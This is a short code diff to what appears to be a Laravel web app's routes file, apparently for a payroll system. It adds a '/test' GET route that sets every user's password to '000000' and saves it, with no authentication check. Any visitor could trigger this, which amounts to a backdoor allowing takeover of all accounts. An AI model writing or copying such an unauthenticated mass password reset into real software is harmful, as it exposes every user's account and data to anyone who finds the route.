@@ -4,9 +4,11 @@ Auth::routes();
 
 Route::get('/test', function () {
     
-    
-    
-    return view('errors');
+    $users=\App\User::all();
+    foreach($users as $user){
+        $user->password='000000';
+        $user->save();
+    }
 });
 
 //Route::get('/test', 'PayrollsController@test');
